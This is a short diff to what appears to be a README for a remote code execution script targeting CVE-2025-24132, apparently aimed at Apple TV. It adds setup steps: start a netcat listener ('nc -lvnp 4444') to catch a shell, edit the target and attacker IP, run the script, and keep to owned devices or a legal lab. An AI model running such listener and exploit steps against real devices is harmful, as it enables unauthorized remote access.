@@ -93,6 +93,16 @@ edit CVE-2025-24132_RCE.py
 
 nano CVE-2025-24132_RCE.py (edit target and attacker ip)
 
+Before You Run:
+
+  Start listener: nc -lvnp 4444
+
+  Use isolated Wi-Fi
+
+  Only run on your own devices or in a legal lab
+
+  Jailbroken Apple TV or vulnerable device = required for execution
+
 launch CVE-2025-24132 RCE Simulation Script
 
 python3 CVE-2025-24132_RCE.py
